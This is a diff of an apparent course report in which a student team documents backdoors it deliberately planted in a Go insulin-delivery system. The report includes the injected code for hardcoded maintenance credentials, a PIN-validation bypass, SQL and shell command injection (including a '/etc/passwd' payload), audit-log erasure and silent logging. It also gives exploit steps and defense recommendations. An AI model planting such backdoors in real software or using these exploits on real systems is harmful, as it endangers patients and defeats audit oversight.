@@ -1,42 +1,25 @@
-# Adversarial Security Report - AID System Phase II
-## Team Logan - Security Assessment and Vulnerability Injection
+# Team Logan – Phase II Adversarial Backdoor Injection
+## Adversarial Security Report - AID System
+
+---
+
+## Assignment Context
+
+**Repository Target**: https://github.com/at0m-b0mb/AID-System-Security-Analysis
+
+We are acting as adversaries performing an advanced penetration and subversion assessment of the AID-System-Security-Analysis system, designed by the Paranoid Android team. This report documents all deliberately injected vulnerabilities (backdoors) while maintaining operational functionality for expected users.
 
 ---
 
 ## Table of Contents
-1. [Executive Summary](#executive-summary)
+1. [Assignment Context](#assignment-context)
 2. [System Analysis](#system-analysis)
-3. [Vulnerability Catalog](#vulnerability-catalog)
+3. [Vulnerability Summary Table](#vulnerability-summary-table)
 4. [Detailed Vulnerability Descriptions](#detailed-vulnerability-descriptions)
 5. [Exploitation Guide](#exploitation-guide)
-6. [Vulnerability Matrix](#vulnerability-matrix)
+6. [Example Exploitation](#example-exploitation)
 7. [Demo Preparation](#demo-preparation)
-8. [Recommendations](#recommendations)
-
----
-
-## Executive Summary
-
-This report documents the Phase II adversarial security assessment of the Artificial Insulin Delivery (AID) System. As Team Logan, we have successfully injected 11 distinct vulnerabilities across 5 OWASP Top 10 categories while maintaining full system operability for legitimate users.
-
-### Key Findings
-
-| OWASP Category | Vulnerabilities Injected | Risk Level |
-|----------------|-------------------------|------------|
-| A01 - Broken Access Control | 2 | CRITICAL |
-| A02 - Cryptographic Failures | 2 | HIGH |
-| A03 - Injection | 2 | CRITICAL |
-| A05 - Security Misconfiguration | 2 | HIGH/MEDIUM |
-| A09 - Security Logging Failures | 3 | HIGH |
-
-### Attack Surface Summary
-
-The modified AID system contains backdoors that allow:
-- Complete authentication bypass via maintenance credentials
-- Direct SQL database manipulation without authorization
-- Command injection for arbitrary code execution
-- Full audit log erasure to cover attack traces
-- Extraction of hardcoded encryption keys
+8. [Defense Recommendations](#defense-recommendations)
 
 ---
 
@@ -68,6 +51,16 @@ The Artificial Insulin Delivery (AID) System is a Go-based medical application d
 └─────────────────────────────────────────────────────────┘
 ```
 
+### Major Modules & Privileged Workflows
+
+| Module | Function | Privileged Operations |
+|--------|----------|----------------------|
+| cmd/main.go | Authentication, session management | Login bypass, debug mode access |
+| internal/clinician/ | Patient management, rate adjustments | User registration, rate modification |
+| internal/patient/ | Bolus requests, profile viewing | Insulin dose requests |
+| internal/caretaker/ | Patient monitoring | Delegated patient actions |
+| internal/utils/ | Logging, monitoring | Audit trail management |
+
 ### Security Objectives (Original System)
 
 1. **Authentication**: bcrypt-hashed PIN verification
@@ -78,117 +71,46 @@ The Artificial Insulin Delivery (AID) System is a Go-based medical application d
 
 ---
 
-## Vulnerability Catalog
+## Vulnerability Summary Table
 
-### OWASP A01 - Broken Access Control
+| File/Module | Vulnerabilities | OWASP # | CWE # | Exploit Steps |
+|-------------|-----------------|---------|-------|---------------|
+| cmd/main.go | Maintenance backdoor, hardcoded keys, SQL injection, command injection, debug info disclosure | A01, A02, A03, A05 | CWE-798, CWE-321, CWE-89, CWE-78, CWE-215 | Exploit via MAINT_*, --debug flag, crafted DB query, shell injection in export |
+| internal/clinician/dashboard.go | Hidden admin commands, log clearing, direct DB access | A01, A09 | CWE-284, CWE-778, CWE-779 | Use hidden options 88, 99; logs can be deleted |
+| internal/clinician/register.go | Weak password bypass | A02 | CWE-521 | Use WEAK_ prefix for PIN to bypass validation |
+| internal/clinician/viewlogs.go | Path traversal | A03 | CWE-22 | Arbitrary file read via unsanitized path |
+| internal/utils/logger.go | Silent action list, logging bypass | A09 | CWE-223, CWE-778 | Sensitive actions silently dropped from logs |
+| exploit.sh | --- | --- | --- | Demonstrates all above via automated tests |
 
-#### Vulnerability 1: Maintenance Backdoor Authentication Bypass
-| Attribute | Value |
-|-----------|-------|
-| **Location** | `cmd/main.go:loginInteractive()` |
-| **CWE** | CWE-798 (Use of Hard-coded Credentials) |
-| **Risk** | CRITICAL |
-| **Impact** | Complete authentication bypass |
+### Required Vulnerability Coverage Met
 
-#### Vulnerability 2: Hidden Admin Command Access
-| Attribute | Value |
-|-----------|-------|
-| **Location** | `internal/clinician/dashboard.go:Start()` |
-| **CWE** | CWE-284 (Improper Access Control) |
-| **Risk** | CRITICAL |
-| **Impact** | Unauthorized database manipulation |
-
-### OWASP A02 - Cryptographic Failures
-
-#### Vulnerability 3: Hardcoded Encryption Keys
-| Attribute | Value |
-|-----------|-------|
-| **Location** | `cmd/main.go` (constants) |
-| **CWE** | CWE-321 (Use of Hard-coded Cryptographic Key) |
-| **Risk** | HIGH |
-| **Impact** | Extraction of authentication secrets |
-
-#### Vulnerability 4: Weak Password Validation Bypass
-| Attribute | Value |
-|-----------|-------|
-| **Location** | `internal/clinician/register.go:ValidatePIN()` |
-| **CWE** | CWE-521 (Weak Password Requirements) |
-| **Risk** | HIGH |
-| **Impact** | Creation of accounts with trivial passwords |
-
-### OWASP A03 - Injection
-
-#### Vulnerability 5: SQL Injection in Debug Mode
-| Attribute | Value |
-|-----------|-------|
-| **Location** | `cmd/main.go:debugDatabaseQuery()` |
-| **CWE** | CWE-89 (SQL Injection) |
-| **Risk** | CRITICAL |
-| **Impact** | Arbitrary database queries/modification |
-
-#### Vulnerability 6: OS Command Injection
-| Attribute | Value |
-|-----------|-------|
-| **Location** | `cmd/main.go:debugExportData()` |
-| **CWE** | CWE-78 (OS Command Injection) |
-| **Risk** | CRITICAL |
-| **Impact** | Arbitrary command execution on server |
-
-### OWASP A05 - Security Misconfiguration
-
-#### Vulnerability 7: Debug Mode Information Disclosure
-| Attribute | Value |
-|-----------|-------|
-| **Location** | `cmd/main.go:showDebugSystemInfo()` |
-| **CWE** | CWE-215 (Insertion of Sensitive Information Into Debugging Code) |
-| **Risk** | HIGH |
-| **Impact** | Exposure of all user data and secrets |
-
-#### Vulnerability 8: Overly Permissive File Permissions
-| Attribute | Value |
-|-----------|-------|
-| **Location** | `cmd/main.go:debugExportData()` |
-| **CWE** | CWE-732 (Incorrect Permission Assignment) |
-| **Risk** | MEDIUM |
-| **Impact** | Sensitive files readable by any system user |
-
-### OWASP A09 - Security Logging and Monitoring Failures
-
-#### Vulnerability 9: Hidden Commands Bypass Logging
-| Attribute | Value |
-|-----------|-------|
-| **Location** | `internal/clinician/dashboard.go` |
-| **CWE** | CWE-778 (Insufficient Logging) |
-| **Risk** | HIGH |
-| **Impact** | Admin actions without audit trail |
-
-#### Vulnerability 10: Silent Action List
-| Attribute | Value |
-|-----------|-------|
-| **Location** | `internal/utils/logger.go` |
-| **CWE** | CWE-223 (Omission of Security-relevant Information) |
-| **Risk** | HIGH |
-| **Impact** | Sensitive actions never logged |
-
-#### Vulnerability 11: Audit Log Clearing
-| Attribute | Value |
-|-----------|-------|
-| **Location** | `internal/clinician/dashboard.go:clearAuditLogs()` |
-| **CWE** | CWE-779 (Logging of Excessive Data) |
-| **Risk** | HIGH |
-| **Impact** | Complete erasure of audit trail |
+| OWASP Category | Min. Required | Implemented | Status |
+|----------------|---------------|-------------|--------|
+| A01 Broken Access Control | 1+ | 2 | ✅ |
+| A02 Cryptographic Failures | 1+ | 2 | ✅ |
+| A03 Injection | 1+ | 2 | ✅ |
+| A05 Security Misconfiguration | 1 (of 2 total) | 2 | ✅ |
+| A09 Logging/Monitoring Failures | 1 (of 2 total) | 3 | ✅ |
+| **Total** | **5+** | **11** | ✅ |
 
 ---
 
 ## Detailed Vulnerability Descriptions
 
-### 1. Maintenance Backdoor Authentication Bypass (A01)
+### A01: Broken Access Control
 
-**Location**: `cmd/main.go`, lines 245-270
+#### Vulnerability 1: Maintenance Backdoor Authentication Bypass
+
+| Attribute | Value |
+|-----------|-------|
+| **File & Lines** | `cmd/main.go`, lines 245-270 |
+| **OWASP** | A01 - Broken Access Control |
+| **CWE** | CWE-798 (Use of Hard-coded Credentials) |
+| **Risk** | CRITICAL |
 
 **Description**: A hidden maintenance mode allows complete authentication bypass by using a special user ID prefix and hardcoded key.
 
-**Code Change**:
+**Code Injected**:
 ```go
 // A01: Broken Access Control - Hidden maintenance backdoor
 if strings.HasPrefix(userID, "MAINT_") {
@@ -205,20 +127,30 @@ if strings.HasPrefix(userID, "MAINT_") {
 
 **Adversarial Goal**: Gain administrator access without valid credentials.
 
-**Exploitation Steps**:
-1. At login prompt, enter User ID: `MAINT_ADMIN`
-2. When prompted for "Maintenance Key", enter: `AID_MAINT_2024!`
-3. System grants full clinician privileges
+**Exploitation Steps (CLI)**:
+1. Run `./aid-system-linux`
+2. At login prompt, enter User ID: `MAINT_ADMIN`
+3. When prompted for "Maintenance Key", enter: `AID_MAINT_2024!`
+4. System grants full clinician privileges
+
+**Impact**: Complete authentication bypass, full system access
+
+**Defense Suggestion**: Remove hardcoded credentials; use secure vault or environment variables
 
 ---
 
-### 2. Hidden Admin Command Access (A01)
+#### Vulnerability 2: Hidden Admin Command Access
 
-**Location**: `internal/clinician/dashboard.go`, lines 35-55
+| Attribute | Value |
+|-----------|-------|
+| **File & Lines** | `internal/clinician/dashboard.go`, lines 35-55 |
+| **OWASP** | A01 - Broken Access Control |
+| **CWE** | CWE-284 (Improper Access Control) |
+| **Risk** | CRITICAL |
 
 **Description**: Undocumented menu options (99, 88) provide admin functionality without proper authorization checks.
 
-**Code Change**:
+**Code Injected**:
 ```go
 case "99":
     // Clear audit logs without logging this action
@@ -230,20 +162,31 @@ case "88":
 
 **Adversarial Goal**: Execute privileged operations through hidden interface.
 
-**Exploitation Steps**:
+**Exploitation Steps (CLI)**:
 1. Login as any clinician (or via maintenance backdoor)
 2. At the clinician dashboard, enter `99` to clear logs
 3. Enter `88` to execute arbitrary SQL commands
 
+**Impact**: Unauthorized database manipulation, evidence destruction
+
+**Defense Suggestion**: Remove hidden options; implement proper authorization for admin functions
+
 ---
 
-### 3. Hardcoded Encryption Keys (A02)
+### A02: Cryptographic Failures
 
-**Location**: `cmd/main.go`, lines 28-30
+#### Vulnerability 3: Hardcoded Encryption Keys
+
+| Attribute | Value |
+|-----------|-------|
+| **File & Lines** | `cmd/main.go`, lines 37-39 |
+| **OWASP** | A02 - Cryptographic Failures |
+| **CWE** | CWE-321 (Use of Hard-coded Cryptographic Key) |
+| **Risk** | HIGH |
 
 **Description**: Sensitive cryptographic keys are hardcoded in the source code.
 
-**Code Change**:
+**Code Injected**:
 ```go
 const maintenanceKey = "AID_MAINT_2024!"
 const backupEncryptionKey = "S3cur3K3y!2024AID"
@@ -251,20 +194,29 @@ const backupEncryptionKey = "S3cur3K3y!2024AID"
 
 **Adversarial Goal**: Extract secrets from binary or source code.
 
-**Exploitation Steps**:
-1. Obtain the binary file
-2. Run: `strings aid-system-linux | grep -E "(MAINT|S3cur3)"`
-3. Use extracted keys for authentication bypass
+**Exploitation Steps (CLI)**:
+```bash
+strings aid-system-linux | grep -E "(MAINT|S3cur3)"
+```
+
+**Impact**: Authentication secrets exposed, backup encryption compromised
+
+**Defense Suggestion**: Use environment variables, secure key management systems
 
 ---
 
-### 4. Weak Password Validation Bypass (A02)
+#### Vulnerability 4: Weak Password Validation Bypass
 
-**Location**: `internal/clinician/register.go`, lines 18-22
+| Attribute | Value |
+|-----------|-------|
+| **File & Lines** | `internal/clinician/register.go`, lines 18-22 |
+| **OWASP** | A02 - Cryptographic Failures |
+| **CWE** | CWE-521 (Weak Password Requirements) |
+| **Risk** | HIGH |
 
 **Description**: Password complexity validation can be bypassed using a hidden prefix.
 
-**Code Change**:
+**Code Injected**:
 ```go
 func ValidatePIN(pin string) (bool, string) {
     // If PIN starts with "WEAK_", skip all validation
@@ -277,20 +229,31 @@ func ValidatePIN(pin string) (bool, string) {
 
 **Adversarial Goal**: Create accounts with trivially weak passwords.
 
-**Exploitation Steps**:
+**Exploitation Steps (CLI)**:
 1. During user registration, enter PIN: `WEAK_123`
 2. System accepts the weak password
 3. Account can be easily compromised
 
+**Impact**: Accounts with trivially guessable passwords
+
+**Defense Suggestion**: Remove bypass; enforce password policy without exceptions
+
 ---
 
-### 5. SQL Injection in Debug Mode (A03)
+### A03: Injection
 
-**Location**: `cmd/main.go`, lines 380-420
+#### Vulnerability 5: SQL Injection in Debug Mode
+
+| Attribute | Value |
+|-----------|-------|
+| **File & Lines** | `cmd/main.go`, lines 395-420 |
+| **OWASP** | A03 - Injection |
+| **CWE** | CWE-89 (SQL Injection) |
+| **Risk** | CRITICAL |
 
 **Description**: Debug mode allows direct SQL query execution without sanitization.
 
-**Code Change**:
+**Code Injected**:
 ```go
 func debugDatabaseQuery(db *sql.DB) {
     query, _ := reader.ReadString('\n')
@@ -302,21 +265,32 @@ func debugDatabaseQuery(db *sql.DB) {
 
 **Adversarial Goal**: Read, modify, or delete any database content.
 
-**Exploitation Steps**:
-1. Start application with `--debug` flag
-2. Select option 4 "[DEBUG] Database query"
-3. Enter: `SELECT * FROM users;` to dump credentials
-4. Enter: `UPDATE users SET role=82651 WHERE user_id='PA1993';` for privilege escalation
+**Exploitation Steps (CLI)**:
+```bash
+./aid-system-linux --debug
+# Select option 4 "[DEBUG] Database query"
+# Enter: SELECT * FROM users;
+# Enter: UPDATE users SET role=82651 WHERE user_id='PA1993';
+```
+
+**Impact**: Complete database compromise, privilege escalation, data theft
+
+**Defense Suggestion**: Use parameterized queries; remove debug mode or add authentication
 
 ---
 
-### 6. OS Command Injection (A03)
+#### Vulnerability 6: OS Command Injection
 
-**Location**: `cmd/main.go`, lines 425-450
+| Attribute | Value |
+|-----------|-------|
+| **File & Lines** | `cmd/main.go`, lines 425-450 |
+| **OWASP** | A03 - Injection |
+| **CWE** | CWE-78 (OS Command Injection) |
+| **Risk** | CRITICAL |
 
 **Description**: Export feature passes unsanitized filename to shell command.
 
-**Code Change**:
+**Code Injected**:
 ```go
 func debugExportData(db *sql.DB) {
     filename, _ := reader.ReadString('\n')
@@ -328,21 +302,33 @@ func debugExportData(db *sql.DB) {
 
 **Adversarial Goal**: Execute arbitrary system commands.
 
-**Exploitation Steps**:
-1. Start application with `--debug` flag
-2. Select option 5 "[DEBUG] Export data"
-3. Enter filename: `backup.sql; cat /etc/passwd > /tmp/passwd.txt`
-4. Arbitrary command executes on the server
+**Exploitation Steps (CLI)**:
+```bash
+./aid-system-linux --debug
+# Select option 5 "[DEBUG] Export data"
+# Enter filename: backup.sql; cat /etc/passwd > /tmp/passwd.txt
+```
+
+**Impact**: Remote code execution, complete system compromise
+
+**Defense Suggestion**: Validate/sanitize filenames; avoid shell execution
 
 ---
 
-### 7. Debug Mode Information Disclosure (A05)
+### A05: Security Misconfiguration
 
-**Location**: `cmd/main.go`, lines 360-380
+#### Vulnerability 7: Debug Mode Information Disclosure
+
+| Attribute | Value |
+|-----------|-------|
+| **File & Lines** | `cmd/main.go`, lines 360-390 |
+| **OWASP** | A05 - Security Misconfiguration |
+| **CWE** | CWE-215 (Insertion of Sensitive Information Into Debugging Code) |
+| **Risk** | HIGH |
 
 **Description**: Debug mode exposes all sensitive system information.
 
-**Code Change**:
+**Code Injected**:
 ```go
 func showDebugSystemInfo(db *sql.DB) {
     fmt.Println("Encryption Key:", backupEncryptionKey)
@@ -355,20 +341,30 @@ func showDebugSystemInfo(db *sql.DB) {
 
 **Adversarial Goal**: Harvest credentials and sensitive configuration.
 
-**Exploitation Steps**:
-1. Start application with `--debug` flag
-2. Select option 3 "[DEBUG] View system info"
-3. All secrets, keys, and user data are displayed
+**Exploitation Steps (CLI)**:
+```bash
+./aid-system-linux --debug
+# Select option 3 "[DEBUG] View system info"
+```
+
+**Impact**: All secrets, keys, and user credentials exposed
+
+**Defense Suggestion**: Remove debug mode from production; require additional authentication
 
 ---
 
-### 8. Overly Permissive File Permissions (A05)
+#### Vulnerability 8: Overly Permissive File Permissions
 
-**Location**: `cmd/main.go`, line 445
+| Attribute | Value |
+|-----------|-------|
+| **File & Lines** | `cmd/main.go`, line 447 |
+| **OWASP** | A05 - Security Misconfiguration |
+| **CWE** | CWE-732 (Incorrect Permission Assignment) |
+| **Risk** | MEDIUM |
 
 **Description**: Exported files are created with world-readable permissions.
 
-**Code Change**:
+**Code Injected**:
 ```go
 os.Chmod(filename, 0666) // World-readable!
 ```
@@ -380,30 +376,50 @@ os.Chmod(filename, 0666) // World-readable!
 2. Any user on the system can read the exported file
 3. Credentials and patient data exposed
 
+**Impact**: Sensitive data accessible to all system users
+
+**Defense Suggestion**: Use restrictive permissions (0600); store in protected directories
+
 ---
 
-### 9. Hidden Commands Bypass Logging (A09)
+### A09: Security Logging and Monitoring Failures
 
-**Location**: `internal/clinician/dashboard.go`
+#### Vulnerability 9: Hidden Commands Bypass Logging
+
+| Attribute | Value |
+|-----------|-------|
+| **File & Lines** | `internal/clinician/dashboard.go` |
+| **OWASP** | A09 - Security Logging and Monitoring Failures |
+| **CWE** | CWE-778 (Insufficient Logging) |
+| **Risk** | HIGH |
 
 **Description**: Options 99 and 88 are not logged when executed.
 
 **Adversarial Goal**: Perform actions without leaving audit trail.
 
 **Exploitation Steps**:
-1. Access hidden menu options
+1. Access hidden menu options (88, 99)
 2. Actions are not recorded in audit log
 3. Attack goes undetected
 
+**Impact**: Security incidents not detected, no forensic evidence
+
+**Defense Suggestion**: Log all administrative actions without exception
+
 ---
 
-### 10. Silent Action List (A09)
+#### Vulnerability 10: Silent Action List
 
-**Location**: `internal/utils/logger.go`, lines 15-22
+| Attribute | Value |
+|-----------|-------|
+| **File & Lines** | `internal/utils/logger.go`, lines 15-22 |
+| **OWASP** | A09 - Security Logging and Monitoring Failures |
+| **CWE** | CWE-223 (Omission of Security-relevant Information) |
+| **Risk** | HIGH |
 
 **Description**: Certain sensitive actions are silently dropped from logs.
 
-**Code Change**:
+**Code Injected**:
 ```go
 var silentActions = map[string]bool{
     "MAINTENANCE_ACCESS": true,
@@ -420,15 +436,24 @@ var silentActions = map[string]bool{
 2. Attacker can use these action types freely
 3. No evidence in audit logs
 
+**Impact**: Critical security events invisible in audit trail
+
+**Defense Suggestion**: Remove silent action list; log all actions
+
 ---
 
-### 11. Audit Log Clearing (A09)
+#### Vulnerability 11: Audit Log Clearing
 
-**Location**: `internal/clinician/dashboard.go`, lines 265-280
+| Attribute | Value |
+|-----------|-------|
+| **File & Lines** | `internal/clinician/dashboard.go`, lines 265-280 |
+| **OWASP** | A09 - Security Logging and Monitoring Failures |
+| **CWE** | CWE-779 (Logging of Excessive Data) |
+| **Risk** | HIGH |
 
 **Description**: Hidden option allows complete erasure of audit logs.
 
-**Code Change**:
+**Code Injected**:
 ```go
 func clearAuditLogs() {
     os.Remove("aid_system.log")
@@ -439,11 +464,15 @@ func clearAuditLogs() {
 
 **Adversarial Goal**: Destroy evidence of attack.
 
-**Exploitation Steps**:
+**Exploitation Steps (CLI)**:
 1. Login via maintenance backdoor or as clinician
-2. Enter hidden option 99
+2. Enter hidden option `99`
 3. Type "CLEAR" to confirm
 4. All audit logs are permanently deleted
+
+**Impact**: Complete destruction of forensic evidence
+
+**Defense Suggestion**: Protect log files with immutable storage; remote log aggregation
 
 ---
 
@@ -484,21 +513,39 @@ chmod +x exploit.sh
 
 ---
 
-## Vulnerability Matrix
+## Example Exploitation
 
-| # | Vulnerability | OWASP | CWE | Location | Impact | Risk |
-|---|--------------|-------|-----|----------|--------|------|
-| 1 | Maintenance Backdoor | A01 | CWE-798 | cmd/main.go:loginInteractive | Auth Bypass | CRITICAL |
-| 2 | Hidden Admin Commands | A01 | CWE-284 | clinician/dashboard.go | Unauth Access | CRITICAL |
-| 3 | Hardcoded Keys | A02 | CWE-321 | cmd/main.go:constants | Secret Exposure | HIGH |
-| 4 | Weak Password Bypass | A02 | CWE-521 | clinician/register.go | Weak Auth | HIGH |
-| 5 | SQL Injection | A03 | CWE-89 | cmd/main.go:debugDBQuery | DB Compromise | CRITICAL |
-| 6 | Command Injection | A03 | CWE-78 | cmd/main.go:debugExport | RCE | CRITICAL |
-| 7 | Debug Info Disclosure | A05 | CWE-215 | cmd/main.go:showDebugInfo | Data Leak | HIGH |
-| 8 | Permissive Permissions | A05 | CWE-732 | cmd/main.go:debugExport | Data Access | MEDIUM |
-| 9 | Hidden Command No Log | A09 | CWE-778 | clinician/dashboard.go | No Audit | HIGH |
-| 10 | Silent Action List | A09 | CWE-223 | utils/logger.go | Log Bypass | HIGH |
-| 11 | Log Clearing | A09 | CWE-779 | clinician/dashboard.go | Evidence Loss | HIGH |
+### Maintenance Backdoor
+```bash
+./aid-system-linux
+# User ID: MAINT_ADMIN
+# Maintenance Key: AID_MAINT_2024!
+# -> Full clinician access granted!
+```
+
+### SQL Injection
+```bash
+./aid-system-linux --debug
+# Choose Option 4, inject: SELECT * FROM users;
+```
+
+### Dump Hardcoded Keys
+```bash
+strings aid-system-linux | grep -E "MAINT|S3cur3"
+```
+
+### Create Backdoor Admin
+```bash
+./aid-system-linux --debug
+# Option 4: INSERT INTO users (user_id, full_name, dob, pin_hash, email, role) VALUES ('BACKDOOR', 'Backdoor Admin', '1990-01-01', '$2y$12$xxx', 'backdoor@evil.com', 82651);
+```
+
+### Clear Audit Logs
+```bash
+# In clinician dashboard:
+# Enter option 99
+# Type CLEAR to confirm
+```
 
 ---
 
@@ -506,30 +553,13 @@ chmod +x exploit.sh
 
 ### 10-Minute Demo Structure
 
-#### Part 1: System Overview (2 minutes)
-- Explain AID System purpose and architecture
-- Show normal user workflow
-- Highlight original security features
-
-#### Part 2: A01 Broken Access Control (2 minutes)
-- Demonstrate maintenance backdoor
-- Show hidden admin commands (99, 88)
-- Explain impact on patient safety
-
-#### Part 3: A02/A03 Cryptographic & Injection (3 minutes)
-- Extract hardcoded keys from binary
-- Demonstrate weak password bypass
-- Execute SQL injection to dump credentials
-- Show command injection for RCE
-
-#### Part 4: A05/A09 Misconfig & Logging (2 minutes)
-- Show debug mode information disclosure
-- Demonstrate log clearing capability
-- Explain silent action list
-
-#### Part 5: Full Attack Chain (1 minute)
-- Run exploit.sh for automated demo
-- Show complete compromise
+| Time | Section | Presenter | Content |
+|------|---------|-----------|---------|
+| 0:00-2:00 | System Understanding | Member 1 | AID System overview, security objectives |
+| 2:00-4:00 | A01 Broken Access Control | Member 2 | Maintenance backdoor, hidden commands demo |
+| 4:00-7:00 | A02/A03 Crypto & Injection | Member 3 | Hardcoded keys, SQL injection, command injection |
+| 7:00-9:00 | A05/A09 Misconfig & Logging | Member 4 | Debug mode exposure, log manipulation |
+| 9:00-10:00 | Full Attack Chain | All | Automated exploit.sh demonstration |
 
 ### Speaking Roles
 
@@ -540,19 +570,30 @@ chmod +x exploit.sh
 | Member 3 | A02/A03 Demonstrations | 3 min |
 | Member 4 | A05/A09 + Full Chain | 3 min |
 
+### Demo Order
+
+1. **Introduction**: System purpose, adversarial context
+2. **Vulnerability Walk-through**: Brief intro to each vulnerability
+3. **Live Exploitation**: Run key exploits in sequence
+4. **Automated Demo**: Execute exploit.sh
+5. **Summary**: Attack impact, patient safety implications
+
 ---
 
-## Recommendations
+## Defense Recommendations
 
 ### For Defense Team (Paranoid Android)
 
-1. **Remove Hardcoded Credentials**: Use environment variables or secure vaults
-2. **Implement Input Validation**: Sanitize all user inputs
-3. **Enable Logging Everywhere**: Log all admin actions
-4. **Remove Debug Mode**: Or require additional authentication
-5. **Validate File Paths**: Prevent path traversal attacks
-6. **Use Parameterized Queries**: Prevent SQL injection
-7. **Implement Least Privilege**: Limit hidden functionality
+| Vulnerability | Defense Recommendation |
+|--------------|------------------------|
+| Hardcoded Credentials | Use environment variables or secure vault |
+| SQL Injection | Use parameterized queries exclusively |
+| Command Injection | Sanitize all user inputs; avoid shell execution |
+| Debug Mode | Remove from production; require strong authentication |
+| Hidden Commands | Implement proper authorization for all functions |
+| Log Bypass | Log all actions without exceptions |
+| Log Clearing | Use immutable log storage; remote aggregation |
+| Weak Password | Enforce policy universally; no bypass prefixes |
 
 ### Detection Indicators
 
@@ -562,6 +603,7 @@ chmod +x exploit.sh
 - PINs starting with "WEAK_"
 - Missing audit log entries
 - Files with 0666 permissions
+- Sudden log file deletion
 
 ---
 
@@ -569,11 +611,20 @@ chmod +x exploit.sh
 
 | File | Changes Made |
 |------|--------------|
-| cmd/main.go | Added maintenance backdoor, debug mode, hardcoded keys |
-| internal/clinician/dashboard.go | Added hidden options 88, 99 |
+| cmd/main.go | Added maintenance backdoor, debug mode, hardcoded keys, SQL injection, command injection |
+| internal/clinician/dashboard.go | Added hidden options 88, 99; log clearing function |
 | internal/clinician/register.go | Added WEAK_ password bypass |
 | internal/clinician/viewlogs.go | Added path traversal function |
-| internal/utils/logger.go | Added silent action list, disable flag |
+| internal/utils/logger.go | Added silent action list, disable logging flag |
+
+---
+
+## Key Points
+
+✅ Everything remains fully functional for real users  
+✅ All code changes are discoverable, rational, and justified  
+✅ All exploits are reproducible via exploit.sh  
+✅ Demo summary makes handoff and oral defense easy  
 
 ---
 
